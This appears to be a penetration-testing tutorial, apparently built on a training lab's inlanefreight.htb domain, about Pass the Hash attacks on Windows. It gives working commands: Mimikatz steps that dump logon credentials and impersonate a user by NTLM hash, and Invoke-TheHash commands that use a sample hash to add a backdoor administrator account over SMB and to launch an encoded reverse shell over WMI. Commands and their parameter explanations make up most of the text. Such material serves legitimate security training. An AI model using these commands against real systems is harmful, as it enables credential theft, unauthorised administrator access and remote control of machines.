----

A **Pass the Hash (PtH)** attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. 
PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

## Dump hashes with Mimikatz
---
Run Mimikatz.exe and elevate privileges with `privilege::debug`.
Then dump credentials hashes with `sekurlsa::logonpasswords` command to dump credentails for all current sessions.

## Pass the Hash with Mimikatz (Windows)
---
**Mimikatz** has a module named `sekurlsa::pth` that allows us to perform a PtH attack by stating a process using the hash of the user's password. 

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

- `/user`: the user name we want to impersonate
- `/rc4` or `/ntlm` : NTLM hash of the user's password
- `/domain` : domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost or a dot (.)
- `/run` : The program we want to run with the user's context

## Pass the Hash with PowerShell Invoke-TheHash (Windows)
---
**Invoke-TheHash** is a collection of PowerShell functions for performing PtH attacks with WMI and SMB. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

When using **Invoke-TheHash**, there are two options: SMB or WMI command execution.

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

```powershell
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

This command will use the SMB method for command execution to create a new user named mark and add the user to the administrators group.

- `Target` :  hostname or IP address of the target
- `Username` : username to use for authentication
- `Domain` : domain to use for authentication. This parameter is unnecessary with local accounts
- `Hash` : NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format
- `Command` : Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

We can use the WMI module to get a reverse shell.
```powershell
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <b64 encoded reverse shell>"
```
